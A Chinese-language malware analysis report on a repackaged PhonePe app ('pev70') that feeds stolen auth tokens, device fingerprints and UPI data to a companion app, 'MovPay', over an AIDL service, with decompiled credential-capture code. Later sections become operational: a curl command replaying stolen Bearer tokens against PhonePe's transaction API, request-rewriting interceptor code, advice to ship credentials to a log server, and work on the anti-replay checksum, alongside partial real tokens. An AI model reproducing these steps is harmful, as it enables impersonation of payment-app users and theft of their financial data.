# IPayService.getPayListByTimeStamp 实现分析

> 核心问题：MovPay 如何通过 pev70 获取 PhonePe 的交易记录（PayList）？

---

## 1. 结论先行

**`getPayList()` 和 `getPayListByTimeStamp()` 在 pev70 中返回空字符串——PhonePe 的交易记录不是通过这两个 AIDL 方法获取的。**

MovPay 获取 PhonePe 交易记录的实际路径是：
1. 通过 `getRequestMeta()` 窃取完整的认证凭证（Token + 设备指纹 + HTTP Headers）
2. 将凭证传给 MovPay 服务端
3. 服务端**冒充用户身份**直接调用 PhonePe 的交易历史 API（`/apis/tstore/v2/units/changes`）

下面是完整的推理链条。

---

## 2. 从 AIDL 接口定义出发

### 2.1 IPayService.java — AIDL 接口定义

**文件位置**（两端都有）：
- pev70 端：`pev70_jadx/sources/com/longfafa/pay/IPayService.java`
- MovPay 端：`mov4.5.3_jadx/sources/com/longfafa/pay/IPayService.java`

```java
// 接口定义（com.longfafa.pay.IPayService）
public interface IPayService extends IInterface {
    String ping();                                    // 事务ID 1
    String onEvent(String name, String key, String value); // 事务ID 2
    String setPayBack(IPayBack callback);             // 事务ID 3
    String getPayList(int page, int size);            // 事务ID 4
    String getUPIList();                              // 事务ID 5
    String getRequestMeta();                          // 事务ID 6
    String getPayListByTimeStamp(long start, long end); // 事务ID 7
    String getUPIRequestMeta();                       // 事务ID 8
}
```

这是一个统一的 AIDL 接口，设计用于 MovPay 跨进程调用**多种钱包**的注入代码。

### 2.2 pev70 端的实现 — 返回空字符串

**文件**：`pev70_jadx/sources/com/longfafa/paylib/JobService.java`，第 119-127 行

```java
@Override
public String getPayList(int i, int i7) {
    return "";  // ← 空实现
}

@Override
public String getPayListByTimeStamp(long j, long j2) {
    return "";  // ← 空实现
}
```

**结论**：pev70 明确不通过 `getPayList`/`getPayListByTimeStamp` 返回任何交易数据。

### 2.3 对比：其他方法有完整实现

同一文件中，其他方法有完整逻辑：

| 方法 | 实现 | 返回内容 |
|------|------|----------|
| `ping()` | `return "pong-70"` | 版本号确认 |
| `getUPIList()` | 调用 `PhonePeHelper.getUPIs()` | 完整的 UPI 账户 JSON 列表 |
| `getRequestMeta()` | 调用 `PhonePeHelper.getRequestMetaInfoObj()` | 完整的认证凭证 JSON |
| `getUPIRequestMeta()` | 调用 `PhonePeHelper.getUPIRequestMetaInfo()` | UPI 专用认证元数据 |
| `onEvent("init",...)` | 调用 `PhonePeHelper.getUserPhoneNum()` | UserInfo (登录状态+手机号) |
| **`getPayList()`** | **`return ""`** | **空字符串** |
| **`getPayListByTimeStamp()`** | **`return ""`** | **空字符串** |

---

## 3. MovPay 端的调用逻辑

### 3.1 AIDL 绑定流程

**文件**：`mov4.5.3_jadx/sources/com/rupeerush/main/MainActivity.java`

```java
// HashMap f863i: appType -> IPayService (已连接的 AIDL 服务)
// HashMap f864j: appType -> ServiceConnection

public final void k(String str) {  // 绑定服务
    Intent intent = new Intent();
    intent.setAction("com.longfafa.pay.BIND_SERVICE");
    intent.setPackage(s.q.c(str));  // 将 appType 映射为包名
    bindService(intent, new m(this, str), flags);
}
```

**appType → 包名映射**（`s/o.java`）：

```java
put("phonepe",    "com.phonepe.app");
put("paytm",      "net.one97.paytm");
put("mobikwik",   "com.mobikwik_new");
put("freecharge", "com.freecharge.android");
put("myjio",      "com.jio.myjio");
put("airtela",    "com.myairtelapp");
put("navi",       "com.naviapp");
put("plugin",     "com.longhaha.plugin");
```

### 3.2 绑定成功后的 ServiceConnection

**文件**：`mov4.5.3_jadx/sources/com/rupeerush/main/m.java`

```java
public final void onServiceConnected(ComponentName componentName, IBinder iBinder) {
    IPayService iPayService = IPayService.Stub.asInterface(iBinder);
    // 发送邀请码事件
    iPayService.onEvent("log", "invitecode", mainActivity.f861g);
    // 存入 HashMap，供后续调用
    mainActivity.f863i.put(str2, iPayService);
    // 设置回调
    iPayService.setPayBack(new l(this));
}
```

### 3.3 getPayList 的实际调用

**文件**：`mov4.5.3_jadx/sources/com/rupeerush/main/e.java`（Runnable，case 0）

这是从 Flutter/Dart 层触发的调用链：

```java
// case 0: Flutter 侧请求获取 PayList
String str = appType;  // 如 "phonepe"

// 第一步：验证App签名
if (s.q.a(mainActivity, str)) {
    // 第二步：绑定 AIDL 服务
    new Thread(new d(mainActivity, str, 5)).start();  // 调用 k() 绑定

    // 等待绑定完成 (最多300ms)
    while (map.get(str) == null && i3 < 3) {
        Thread.sleep(100);
        i3++;
    }

    // 第三步：在新线程中获取 PayList
    StringBuilder sb = new StringBuilder();
    new Thread(new h(mainActivity, str, sb, this.d, 1)).start();

    // 等待结果 (超时时间按钱包类型不同)
    int timeout = "paytm".equals(str) ? 290 :
                  "mobikwik".equals(str) ? 50 : 190;
    for (int i5 = 0; sb.length() == 0 && i5 < timeout; i5++) {
        Thread.sleep(100);  // 每100ms检查一次
    }

    string = sb.length() == 0 ? "[]" : sb.toString();
}

// 第四步：返回结果给 Flutter
mainActivity.runOnUiThread(new f(uVar, string, 9));
```

### 3.4 h.java — 按钱包类型分发 PayList 请求

**文件**：`mov4.5.3_jadx/sources/androidx/media3/exoplayer/audio/h.java`（混淆到 media3 包中隐藏真实用途）

**完整的 case 1 逻辑**：

```java
// case 1: 获取 PayList
IPayService iPayService = map.get(str);      // 获取 AIDL 服务代理
String strOnEvent = iPayService.onEvent("init", "", "");  // 获取 UserInfo
Boolean isLoggedIn = new UserInfo(strOnEvent).login;

if (isLoggedIn) {
    if ("phonepe".equals(str)) {
        sb.append(iPayService.getPayList(0, 10));        // ← PhonePe: 返回 ""
    } else if ("airtela".equals(str)) {
        sb.append(iPayService.getPayList(0, 20));        // Airtel: 20条
    } else if ("paytm".equals(str)) {
        sb.append(iPayService.getPayList(0, 5));         // Paytm: 5条
    } else if ("mobikwik".equals(str)) {
        // MobiKwik 使用时间戳查询
        long now = Instant.now().toEpochMilli();
        long thirtyMinAgo = Instant.now().minus(30, ChronoUnit.MINUTES).toEpochMilli();

        // 如果 str2 有值（服务端下发的参考时间戳），以其为中心 ±15分钟/±3分钟
        long referenceTime = Long.parseLong(str2);
        if (referenceTime > 0) {
            now = referenceTime + 900000;      // + 15分钟
            thirtyMinAgo = referenceTime - 180000;  // - 3分钟
        }

        sb.append(iPayService.getPayListByTimeStamp(now, thirtyMinAgo));  // 按时间查
    } else {
        sb.append(iPayService.getPayList(0, 10));        // 其他: 10条
    }

    y.q("getPayListBack2", sb.toString());  // 记录到事件日志
}
```

**关键观察**：
- **PhonePe** 调用 `getPayList(0, 10)` → pev70 返回 `""` → sb 最终为 `""`
- **MobiKwik** 调用 `getPayListByTimeStamp(start, end)` → 可能其注入包有实际实现
- 所有结果通过 `y.q("getPayListBack2", ...)` 记录到事件日志系统

### 3.5 y.q() — 事件上报到服务器

**文件**：`mov4.5.3_jadx/sources/W/y.java`，第 297 行

```java
public static void q(String str, String str2) {
    // Debug 模式才打印到 Logcat
    if ((f1334a.getApplicationInfo().flags & 2) != 0) {
        Log.e("------1", str + "=" + str2);
    }
    // 插入本地 SQLite 数据库
    c.m(new C0190a(AbstractC0189b.a(), str, str2, System.currentTimeMillis()));
    // 触发上传线程
    t();
}
```

`y.q()` 将事件存入 `operateinfo.db` 数据库，然后由后台线程（`com/rupeerush/main/o.java` case 1）从数据库取出 → 序列化为 `ELog` → 通过 `s.m.d()` HTTP POST 到远程服务器。

---

## 4. PayInfo 数据模型 — 存在但未使用

**文件**：`pev70_jadx/sources/com/longfafa/paylib/pojo/PayInfo.java`

```java
public class PayInfo extends BasePoJo {
    @FieldDesc(key = "txnId")          public String txnId;
    @FieldDesc(key = "txnDate")        public String txnDate;
    @FieldDesc(key = "amount")         public String amount;
    @FieldDesc(key = "state")          public String state;
    @FieldDesc(key = "utr")            public String utr;      // UPI 交易参考号
    @FieldDesc(key = "payAccount")     public String payAccount;
    @FieldDesc(key = "reciveAccount")  public String reciveAccount;
    @FieldDesc(key = "payBankNumber")  public String PayBankNumber;
    @FieldDesc(key = "receiveBankNumber") public String ReceiveBankNumber;
    @FieldDesc(key = "description")    public String description;
    @FieldDesc(key = "remark")         public String remark;
    @FieldDesc(key = "flowType")       public Integer flowType;
    @FieldDesc(key = "showId")         public String showId;
    @FieldDesc(key = "appType")        public String appType;
}
```

这个数据模型定义了完整的交易记录结构，包含交易ID、金额、状态、UTR、付款/收款账号等。**但在 pev70 的代码中，`PayInfo` 没有被任何地方构造或填充** — `getPayList()` 直接返回空字符串，跳过了整个数据填充逻辑。

这说明 `PayInfo` 是为**其他钱包**（如 MobiKwik、Paytm）的注入版本设计的通用数据模型，这些钱包的注入代码可能会直接读取本地交易数据库并填充 `PayInfo` 对象返回给 MovPay。

---

## 5. PhonePe 的实际交易记录获取机制

既然 `getPayList()` 返回空，PhonePe 的交易记录是如何被获取的？

### 5.1 getRequestMeta() — 窃取完整认证凭证

**文件**：`pev70_jadx/sources/com/PhonePeTweak/Def/PhonePeHelper.java`，第 1421 行

`getRequestMetaInfoObj()` 返回的 JSON 包含：

```json
{
    "userId": "user_xxx",                     // 用户 ID
    "phoneNumber": "91xxxxxxxxxx",            // 手机号
    "deviceId": "xxxxxxxx",                   // PhonePe 设备 ID
    "deviceFingerprint": "加密的设备指纹",      // X-Device-Fingerprint
    "headers": {                              // 所有必需的 HTTP 请求头
        "X-APP-ID": "...",
        "X-MERCHANT-ID": "...",
        "X-SOURCE-VERSION": "...",
        "X-DG-G": "...",
        "X-DG-CA": "1",
        "X-SOURCE-LOCALE": "en"
    },
    "token": {                                // 1FA Token (一级认证)
        "token": "eyJhbGciOi...",
        "refreshToken": "...",
        "expiry": 1234567890
    },
    "authToken": {...},                       // Auth Token
    "ssoToken": {...},                        // SSO Token
    "accountsToken": {...},                   // Accounts Token
    "tokenMigrationEnabled": true,
    "tokenMigrationSuccessful": true,
    "mobileSummary": {...},                   // 设备摘要
    "hardwareDetails": {...},                 // 硬件详情
    "networkContext": {...},                   // 网络环境
    "mobileVerificationUtils": {...},         // 手机验证工具信息
    "phonePeManifest": {...},                 // PhonePe 清单
    "simInfoProvider": {...},                 // SIM 卡信息
    "displayPhoneNumber": {...},              // 显示手机号
    "networkStatus": {...},                   // 网络状态
    "mobileDetails": {...},                   // 设备移动详情
    "location": {...},                        // 位置信息
    "profileUserMappingRequest": {...},       // 用户映射请求
    "baseRequestBuilder": {...},              // 基础请求构建器配置
    "guardianContextStr": "..."              // Guardian 安全上下文
}
```

### 5.2 Headers 的专门捕获 — 瞄准交易 API

**文件**：`PhonePeHelper.java`，第 1608-1625 行

```java
// 专门从交易 API 的请求中截取 HTTP Headers
public static void printHeaders(String str, Request.Builder builder) {
    if (str == null || !str.contains("/apis/tstore/v2/units/changes")) {
        return;  // 只关注交易 API 的 headers
    }
    Headers headersBuild = builder.getHeaders().build();
    if (headers == null) {
        headers = headersBuild;
        saveHeadersToSH(headersBuild);  // 保存到 SharedPreferences
    }
}

public static void printHeadersV2(String str, Headers headers2) {
    if (str != null && str.contains("/apis/tstore/v2/units/changes") && headers == null) {
        headers = headers2;
        saveHeadersToSH(headers2);
    }
}
```

**这两个方法明确表明**：
- `/apis/tstore/v2/units/changes` 是 PhonePe 的**交易记录变更 API**
- 注入代码**专门捕获**发往这个 API 的 HTTP Headers
- Headers 被保存到 SharedPreferences（`headers_info`）以供后续使用

### 5.3 getMetaInfo() — 构造伪装请求头

**文件**：`PhonePeHelper.java`，第 1669 行

```java
public static JSONObject getMetaInfo() {
    // 从 PhonePe 的 SharedPreferences 读取服务端标识
    SharedPreferences sp = getContext().getSharedPreferences("networkPreferences", 0);
    String appId = sp.getString("key_header_app_id", "");
    String merchantId = sp.getString("key_header_merchant_id", "");
    String version = sp.getInt("key_header_version", 0);

    JSONObject headers = new JSONObject();
    headers.put("X-APP-ID", appId);
    headers.put("X-MERCHANT-ID", merchantId);
    headers.put("X-SOURCE-VERSION", version);
    headers.put("X-DG-G", GetG1());     // Guardian 安全参数
    headers.put("X-DG-CA", "1");
    headers.put("X-SOURCE-LOCALE", "en");
    return headers;
}
```

---

## 6. 完整推理链：PhonePe 交易记录的获取路径

```
┌─────────────────────────────────────────────────────────────┐
│  MovPay Flutter UI                                          │
│  用户点击"获取交易记录"                                      │
└──────────────┬──────────────────────────────────────────────┘
               │ Flutter MethodChannel
               ▼
┌─────────────────────────────────────────────────────────────┐
│  com.rupeerush.main.e (case 0)                              │
│  1. 验证App签名 s.q.a()                                     │
│  2. 绑定 AIDL 服务: action="com.longfafa.pay.BIND_SERVICE"  │
│     package="com.phonepe.app"                               │
│  3. 等待连接 (最多300ms)                                     │
└──────────────┬──────────────────────────────────────────────┘
               │ AIDL IPC (跨进程)
               ▼
┌─────────────────────────────────────────────────────────────┐
│  androidx.media3.exoplayer.audio.h (case 1)                 │
│  (混淆到 media3 包中隐藏真实用途)                             │
│                                                             │
│  if ("phonepe".equals(str)) {                               │
│      sb.append(iPayService.getPayList(0, 10));              │
│      // ↓ 调用 pev70 的 JobService                          │
│  }                                                          │
└──────────────┬──────────────────────────────────────────────┘
               │ AIDL Binder
               ▼
┌─────────────────────────────────────────────────────────────┐
│  pev70: com.longfafa.paylib.JobService.IPayServiceBinder    │
│                                                             │
│  getPayList(0, 10) → return ""   ← 空实现！                 │
│  getPayListByTimeStamp() → return ""   ← 空实现！           │
│                                                             │
│  但这些方法有完整实现：                                       │
│  ✓ getRequestMeta() → 完整认证凭证                          │
│  ✓ getUPIList() → 完整UPI账户列表                            │
│  ✓ getUPIRequestMeta() → UPI认证元数据                      │
└──────────────┬──────────────────────────────────────────────┘
               │
               │  getPayList 返回空，但 MovPay 另有途径
               │
               ▼
┌─────────────────────────────────────────────────────────────┐
│  MovPay 服务端 (推断的后端行为)                                │
│                                                             │
│  使用 getRequestMeta() 返回的凭证：                          │
│  • 1FA Token (Bearer 认证)                                  │
│  • Device Fingerprint (X-Device-Fingerprint)                │
│  • HTTP Headers (X-APP-ID, X-MERCHANT-ID 等)                │
│  • userId, phoneNumber                                      │
│                                                             │
│  构造请求 → PhonePe API 服务器                               │
│  GET /apis/tstore/v2/units/changes                          │
│  Authorization: Bearer <1fa_token>                          │
│  X-Device-Fingerprint: <stolen_fingerprint>                 │
│  X-APP-ID: <stolen_app_id>                                  │
│  ...                                                        │
│                                                             │
│  ← 返回完整交易历史记录                                      │
└─────────────────────────────────────────────────────────────┘
```

---

## 7. 为什么 PhonePe 不用 getPayList 而其他钱包用？

### 7.1 架构差异

| 钱包 | PayList 实现方式 | 原因推测 |
|------|-----------------|----------|
| **PhonePe** | `getPayList()` 返回空；通过凭证窃取 + 服务端 API 调用 | PhonePe 使用加密数据库（Room + 加密），本地交易数据难以直接读取 |
| **MobiKwik** | `getPayListByTimeStamp(start, end)` 有实现 | MobiKwik 可能有可直接读取的本地交易数据 |
| **Paytm** | `getPayList(0, 5)` 有实现 | Paytm 可能有明文 SharedPreferences 存储交易记录 |
| **Airtel** | `getPayList(0, 20)` 有实现 | Airtel 可能有可直接读取的本地存储 |

### 7.2 PhonePe 的替代策略

对于 PhonePe，攻击者采取了**更高级的策略**：

1. **不读取本地数据库**（可能因为加密或架构限制）
2. **窃取全部认证凭证**（Token + Headers + 设备指纹）
3. **由服务端冒充用户**直接调用 PhonePe 的 REST API
4. 这种方式能获取**更多、更完整**的交易数据，不受本地缓存限制

### 7.3 证据：PhonePeHelper 专门捕获交易 API Headers

`printHeaders()` 和 `printHeadersV2()` 方法**只关注** `/apis/tstore/v2/units/changes` 端点的 Headers — 这个端点就是 PhonePe 的交易记录 API。这证实了攻击者专门为服务端 API 调用收集必要的认证信息。

---

## 8. MobiKwik 的 getPayListByTimeStamp 时间窗口分析

虽然 PhonePe 不使用此方法，但 MovPay 对 MobiKwik 的调用逻辑值得分析：

```java
// 默认: 查询最近30分钟的交易
long now = Instant.now().toEpochMilli();
long thirtyMinAgo = now - 30 * 60 * 1000;

// 如果服务端下发了参考时间戳:
long referenceTime = Long.parseLong(str2);
if (referenceTime > 0) {
    now = referenceTime + 900000;       // 参考时间 + 15分钟
    thirtyMinAgo = referenceTime - 180000;  // 参考时间 - 3分钟
}

iPayService.getPayListByTimeStamp(now, thirtyMinAgo);
```

**这表明 MovPay 能精确查询特定时间窗口的交易**：
- 服务端知道用户何时发起了交易（通过 SOCKS5 代理流量监控或 OkHttp 拦截器日志）
- 下发参考时间戳 `str2`
- 以该时间为中心，查询 `-3分钟` 到 `+15分钟` 的交易
- 这个窗口足以捕获从交易发起到确认完成的全过程

---

## 9. getRequestMeta() 返回的完整凭证清单

以下是 MovPay 通过 `getRequestMeta()` 从 pev70 获取的所有数据字段：

```
认证 Token:
├── 1FA Token (token + refreshToken + expiry)
├── Auth Token
├── SSO Token
└── Accounts Token

设备身份:
├── userId
├── phoneNumber
├── deviceId (PhonePe 内部设备 ID)
├── deviceFingerprint (加密的 X-Device-Fingerprint)
└── androidId

HTTP 请求头:
├── X-APP-ID
├── X-MERCHANT-ID
├── X-SOURCE-VERSION
├── X-DG-G (Guardian 安全参数)
├── X-DG-CA
└── X-SOURCE-LOCALE

设备/环境信息:
├── mobileSummary
├── hardwareDetails
├── networkContext
├── networkStatus
├── mobileDetails
├── simInfoProvider
├── displayPhoneNumber
├── location
├── phonePeManifest
├── profileUserMappingRequest
├── baseRequestBuilder
├── guardianContextStr
└── mobileVerificationUtils
```

**有了这些数据，服务端可以完整伪造一个 PhonePe 客户端请求**，PhonePe 的后端无法区分这个请求来自真实客户端还是攻击者的服务器。

---

## 10. 事件日志上报通道 — y.q() 详解

无论 `getPayList` 返回什么，结果都通过 `y.q("getPayListBack2", result)` 上报：

```
y.q("getPayListBack2", result)
    │
    ├─→ 插入 SQLite (operateinfo.db, operateinfo 表)
    │   字段: _id, event_key, event_name, event_param, event_time
    │
    └─→ 触发上传线程 t()
         │
         └─→ com.rupeerush.main.o (case 1) 无限循环
              │
              ├─→ 从 SQLite 读取未上传事件
              ├─→ 序列化为 ELog (eventName + eventParam + appName + gaId + eventTime)
              ├─→ 通过 s.m.d() HTTP POST 到远程服务器
              └─→ 成功后从 SQLite 删除
```

**上报服务器**：通过 `com.rupeerush.utils.common.ServerUtils`（native `liblongfafa.so`）发送。

---

## 11. 总结

### PhonePe 交易记录获取的真实路径

```
                         pev70 (重打包 PhonePe)
                        ┌──────────────────────┐
                        │                      │
  PhonePe 用户操作 ────►│  Pine Hook 框架      │
  (登录、转账、查账)     │  ├─ OkHttp 拦截器    │──► 截获每一个 HTTP 请求/响应
                        │  ├─ Dagger DI 劫持    │──► 访问内部数据库和 Token
                        │  ├─ PIN/OTP 捕获      │──► 明文 PIN 和 OTP
                        │  └─ Header 捕获       │──► /apis/tstore/v2/units/changes
                        │                      │
                        │  AIDL 服务暴露:       │
                        │  ├ getPayList() = ""  │ ← 空实现（不在此获取交易列表）
                        │  ├ getRequestMeta()   │ ← ★ 返回全部认证凭证
                        │  ├ getUPIList()       │ ← ★ 返回 UPI 账户列表
                        │  └ getUPIRequestMeta()│ ← ★ 返回 UPI 认证元数据
                        └──────────┬───────────┘
                                   │ AIDL IPC
                                   ▼
                        ┌──────────────────────┐
                        │  MovPay              │
                        │  ├ 调用 getPayList() │──► 收到 "" (空)
                        │  ├ 调用 getRequestMeta()──► 收到完整凭证 ★
                        │  └ 上报到服务器       │
                        └──────────┬───────────┘
                                   │ HTTP POST (liblongfafa.so)
                                   ▼
                        ┌──────────────────────┐
                        │  远程服务器           │
                        │                      │
                        │  使用窃取的凭证       │
                        │  冒充用户直接调用      │
                        │  PhonePe REST API     │
                        │                      │
                        │  GET /apis/tstore/    │
                        │  v2/units/changes     │──► PhonePe 服务器返回交易记录
                        └──────────────────────┘
```

### 核心发现

1. **`getPayList()`/`getPayListByTimeStamp()` 在 pev70 中是空实现**，返回 `""`
2. **`PayInfo` 数据模型存在但未被使用** — 它是为其他钱包（MobiKwik/Paytm/Airtel）设计的
3. **PhonePe 的交易记录通过凭证窃取 + 服务端 API 调用获取**，不经过本地 AIDL 接口
4. `getRequestMeta()` 返回的凭证**完整到足以伪造任何 PhonePe API 请求**
5. `PhonePeHelper.printHeaders()` **专门针对** `/apis/tstore/v2/units/changes`（交易历史 API）收集 Headers
6. 这种**服务端代理调用**方式比直接读取本地数据更强大 — 可以获取完整的交易历史，不受本地缓存大小限制

---

## 12. tstore API 同步机制深度分析

### 12.1 核心发现：这是增量同步 API，不是全量查询 API

`/apis/tstore/v2/units/changes` 是一个**增量同步（Incremental Sync）API**，而不是全量历史查询 API。

**工作原理**：

```
第一次同步（初始同步）:
  fromTimestamp=0 → 服务器返回所有交易记录 → 存入本地数据库

后续同步（增量同步）:
  fromTimestamp=最后同步时间 → 服务器只返回该时间之后的新变更 → 合并到本地数据库
```

这就解释了为什么本地拦截到的请求经常返回 `"changes": []` — 因为自上次同步以来没有新的交易。

### 12.2 PhonePe 的双向同步管理器

**文件位置**：`com/phonepe/transactioncore/datasource/sync/`

PhonePe 使用两个同步管理器进行双向同步：

| 管理器 | 排序方向 | 用途 |
|--------|----------|------|
| `AscTransactionSyncManager` | ASC（升序） | 从旧到新同步，用于补充历史记录 |
| `DescTransactionSyncManager` | DESC（降序） | 从新到旧同步，用于获取最新交易 |

**代码证据**（`AscTransactionSyncManager.java:39`）：

```java
this.f126654h = "ASC";  // 标识为升序同步
```

**代码证据**（`DescTransactionSyncManager.java:116`）：

```java
this.f126667j = "DESC";  // 标识为降序同步
```

### 12.3 API 请求格式

**端点**：`POST /apis/tstore/v2/units/changes`

**重要发现**：参数通过 **URL Query Parameters** 传递，而非 POST Body！

**实际请求 URL 示例**：

```
POST https://apicp1.phonepe.com/apis/tstore/v2/units/changes
  ?viewVersion=54
  &viewId=phonepeApp__APPView
  &size=15
  &metaId=U2601181448359012876957
  &fromTimestamp=1769917541116
  &sortOrder=ASC
```

**关键参数说明**：

| 参数 | 类型 | 示例值 | 说明 |
|------|------|--------|------|
| `viewVersion` | int | 54 | 数据视图版本号 |
| `viewId` | string | phonepeApp__APPView | 视图标识符 |
| `size` | int | 15 | 每页返回的记录数 |
| `metaId` | string | U2601181448359012876957 | 用户元数据 ID |
| `fromTimestamp` | long | 1769917541116 | 从该时间戳之后获取变更，设为 0 触发初始同步 |
| `sortOrder` | string | ASC/DESC | 排序方向 |

**响应格式**：

```json
{
  "code": 200,
  "time": 1,
  "success": true,
  "response": {
    "size": 0,
    "changes": []
  }
}
```

### 12.4 本地缓存机制

PhonePe 使用 Room 数据库存储同步状态：

**同步指针表**：`app_instruction_subsystem_pointer`

```sql
CREATE TABLE app_instruction_subsystem_pointer (
    pointerId TEXT PRIMARY KEY,
    latestPointer TEXT,
    oldestPointer TEXT,
    lastSyncTime INTEGER
);
```

**交易数据表**包含 `tstore_data` 列存储原始 JSON 数据。

### 12.5 为什么拦截到的请求体为空？

**结论：请求体为空是正常的！**

通过 adb logcat 分析发现，tstore API 的参数是通过 **URL Query Parameters** 传递的，而非 POST Body：

```
02-03 08:46:44.938 D HttpInterceptor: HTTPS: POST https://apicp1.phonepe.com/apis/tstore/v2/units/changes
  ?viewVersion=54
  &viewId=phonepeApp__APPView
  &size=15
  &metaId=U2601181448359012876957
  &fromTimestamp=1769917541116
  &sortOrder=ASC
```

所以 `request_body` 为空是**完全正常**的设计，所有同步参数都在 URL 中。

**为什么返回 `"changes": []`？**

因为 `fromTimestamp=1769917541116` 对应的是最后一次同步时间（2026年2月1日 11:45:41）。服务器只返回该时间之后的新变更，由于没有新交易发生，所以返回空数组。

**其他 API 的请求体读取问题**

对于其他使用 POST Body 的 API，如果出现 `REQ body read failed: NoSuchMethodError`，则是因为 OkHttp 的 `RequestBody.writeTo()` 方法被混淆。但大部分 API 的请求体可以正常读取。

### 12.6 如何获取完整历史交易记录

#### 方案 A：修改 URL 参数中的 fromTimestamp

由于参数在 URL 中，需要在拦截器中修改 URL：

```java
// 在拦截器中修改 URL
if (url.contains("/apis/tstore/v2/units/changes")) {
    // 将 fromTimestamp 参数改为 0
    String newUrl = url.replaceAll("fromTimestamp=\\d+", "fromTimestamp=0");
    // 重新构建请求
    Request newRequest = request.newBuilder().url(newUrl).build();
    return chain.proceed(newRequest);
}
```

#### 方案 B：清除本地同步状态

清除 PhonePe 的数据库，强制应用重新执行初始同步：

```bash
# 清除应用数据（会导致重新登录）
adb shell pm clear com.phonepe.app

# 或仅清除数据库（需要 root）
adb shell "su -c 'rm -rf /data/data/com.phonepe.app/databases/core_database*'"
```

#### 方案 C：使用窃取的凭证进行服务端 API 调用（pev70 的方法）

这是最有效的方法，也是 pev70 恶意软件采用的策略：

1. 通过 `getRequestMeta()` 获取完整凭证
2. 在服务端构造伪装请求（参数在 URL Query Parameters 中）：

```bash
curl -X POST "https://apicp1.phonepe.com/apis/tstore/v2/units/changes\
?viewVersion=54\
&viewId=phonepeApp__APPView\
&size=500\
&metaId=<stolen_metaId>\
&fromTimestamp=0\
&sortOrder=DESC" \
  -H "Authorization: Bearer <stolen_1fa_token>" \
  -H "X-Device-Fingerprint: <stolen_fingerprint>" \
  -H "X-APP-ID: <stolen_app_id>" \
  -H "X-MERCHANT-ID: <stolen_merchant_id>" \
  -H "X-DG-G: <guardian_token>" \
  -H "Content-Type: application/json"
```

**关键参数修改**：
- `fromTimestamp=0` - 从最早时间开始获取
- `size=500` - 增大每页数量以减少请求次数

### 12.7 pev70 专门捕获 tstore Headers 的原因

**文件**：`PhonePeHelper.java:1608-1625`

```java
public static void printHeaders(String str, Request.Builder builder) {
    if (str == null || !str.contains("/apis/tstore/v2/units/changes")) {
        return;  // 只关注 tstore API
    }
    Headers headersBuild = builder.getHeaders().build();
    if (headers == null) {
        headers = headersBuild;
        saveHeadersToSH(headersBuild);  // 保存到 SharedPreferences
    }
}
```

**目的**：捕获发往交易 API 的完整 HTTP Headers（包括动态生成的安全参数如 `X-DG-G`），用于服务端冒充用户身份调用 API。

### 12.8 安全研究建议

对于安全研究目的，推荐组合使用以下方法：

1. **改进 RemoteLoggingInterceptor**：
   - 增加更详细的调试日志
   - 尝试多种方式读取请求体
   - 记录 RequestBody 的具体类名

2. **记录完整的 Request Meta**：
   - 使用 `getRequestMeta()` 获取凭证
   - 将凭证发送到 log_server
   - 在服务端使用凭证直接调用 API

3. **分析本地数据库**：
   - 读取 `/data/data/com.phonepe.app/databases/core_database*`
   - 分析 `tstore_data` 列中已缓存的交易数据

---

## 13. 相关文件索引

| 文件 | 路径 | 说明 |
|------|------|------|
| BaseTransactionSyncManager | `phonepe_original_jadx/.../datasource/sync/BaseTransactionSyncManager.java` | 基础同步管理器，包含 tstore API 调用 |
| AscTransactionSyncManager | `phonepe_original_jadx/.../datasource/sync/AscTransactionSyncManager.java` | 升序同步管理器 |
| DescTransactionSyncManager | `phonepe_original_jadx/.../datasource/sync/DescTransactionSyncManager.java` | 降序同步管理器 |
| PhonePeHelper | `pev70_jadx/.../com/PhonePeTweak/Def/PhonePeHelper.java` | pev70 的核心 Hook 工具类 |
| RemoteLoggingInterceptor | `src/apk/https_interceptor/.../interceptor/RemoteLoggingInterceptor.java` | HTTP 请求拦截器 |
| log_server | `src/services/log_server/src/server.js` | 日志接收服务器 |

---

## 14. X-REQUEST-CHECKSUM-V4 校验和机制（重要）

### 14.1 问题：为什么修改 X-REQUEST-START-TIME 无效？

用户尝试将 `X-REQUEST-START-TIME` 头设置为 0，期望获取历史交易记录，但结果仍然是空的 `"changes": []`。

**原因：`X-REQUEST-START-TIME` 和 `fromTimestamp` 是两个完全不同的参数！**

| 参数 | 位置 | 用途 |
|------|------|------|
| `X-REQUEST-START-TIME` | HTTP Header | 性能监控，记录客户端请求发起的时间戳 |
| `fromTimestamp` | URL Query Parameter | **同步起点**，控制从何时开始获取交易变更 |

### 14.2 实际捕获的请求示例

```
POST https://apicp1.phonepe.com/apis/tstore/v2/units/changes
  ?viewVersion=54
  &viewId=phonepeApp__APPView
  &size=15
  &metaId=U2601181448359012876957
  &fromTimestamp=1769917541116        ← 这个控制同步起点！
  &sortOrder=ASC

Headers:
  Authorization: Bearer hq4wOGdzX31IuPyyh7/7AYOLiipO42P8Qt...
  X-REQUEST-START-TIME: 1738560404939  ← 这只是性能监控时间戳
  X-REQUEST-CHECKSUM-V4: NWZhZjE2VzM4ZDliaWYwWS02N2RsR1RaYy00ZHlxckFlVDBjVTZlYnVCTitE...  ← 请求校验和
  X-DG-G: bcdc0aa3cddaaaacf5a1e8b97419d721b4b4bb9a2dbb09f4364499377b48...
```

### 14.3 X-REQUEST-CHECKSUM-V4 校验和的实现（逆向分析）

**文件位置**：`phonepe_original_jadx/sources/com/phonepe/network/external/rest/interceptors/c.java`

通过逆向分析，找到了校验和的生成逻辑：

```java
// 校验和生成方法 h()
public final Pair<Request.Builder, Long> h(Chain chain, String encodedPath, byte[] requestBody,
                                            String uuid, boolean isV2Plus, String version) {
    if ("v4_1".equals(version)) {
        // V4 版本使用 jnmcs 函数
        byte[] checksum = EncryptionUtils.jnmcs(
            context,
            encodedPath.getBytes(),   // URL 路径
            requestBody,              // 请求体
            uuid.getBytes(),          // 每次请求的唯一 UUID
            context
        );
        builder.addHeader("X-REQUEST-CHECKSUM-V4", new String(checksum));
        builder.addHeader("X-REQUEST-ALIAS", "V4_1");
    } else {
        // V2/V3 版本使用不同函数
        byte[] checksum = EncryptionUtils.jnmc(...);
        builder.addHeader("X-REQUEST-CHECKMATE", new String(checksum));
    }
}
```

**校验和覆盖的内容（已确认）**：
- `encodedPath` - URL 编码路径（包括 Query Parameters！）
- `requestBody` - 请求体字节
- `uuid` - 每个请求的唯一标识（`UUID.randomUUID()`）

**关键发现**：
1. **校验和由 Native 代码生成** — `EncryptionUtils.jnmcs()` 很可能调用 JNI 方法
2. **每个请求都有唯一 UUID** — 防止重放攻击
